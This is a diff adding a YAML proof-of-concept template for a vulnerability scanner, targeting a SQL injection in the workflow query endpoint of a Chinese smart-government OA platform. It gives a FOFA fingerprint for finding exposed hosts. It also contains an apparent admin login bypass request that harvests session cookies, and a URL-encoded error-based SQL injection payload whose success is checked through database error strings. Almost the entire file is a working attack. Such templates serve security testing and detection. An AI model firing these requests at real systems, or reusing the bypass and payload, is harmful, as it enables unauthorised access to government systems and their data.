@@ -1,0 +1,28 @@
+id: poc-yaml-szt-smart-governmet-query-index-sqli
+info:
+  name: 数字通云平台智慧政务workflow SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 数字通云平台智慧政务OA
+  fofa: body="assets/8cca19ff/css/bootstrap-yii.css"
+requests:
+- method: POST
+  path: /portal/default/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: userID=admin&flag=rone
+  output:
+  - regex_match(headers,"GOASESSID=(?P<cookie1>.*?);")
+  - regex_match(headers,` (?P<cookie2>.*?); expires`)
+  expression: "status_code == 302 && \nbody == \"\"\n"
+- method: GET
+  path: /workflow/query/index?WfRtApplication%5Bselect_user%5D=1%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71786b7a71%2C%28SELECT%20%28ELT%285761=5761%2C1%29%29%29%2C0x7162717871%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29
+  headers:
+    Cookie: GOASESSID={{.cookie1}};{{.cookie2}}
+    X-Requested-With: XMLHttpRequest
+  expression: "status_code == 200 && \ncontains(body,\"'qxkzq1qbqxqx'\") &&\ncontains(body,\"\
+    SQLSTATE\") &&\ncontains(body,\"CDbCommand\") &&\ncontains(body,\"PHP Error\"\
+    )\n"
+variables: {}
+transport: http
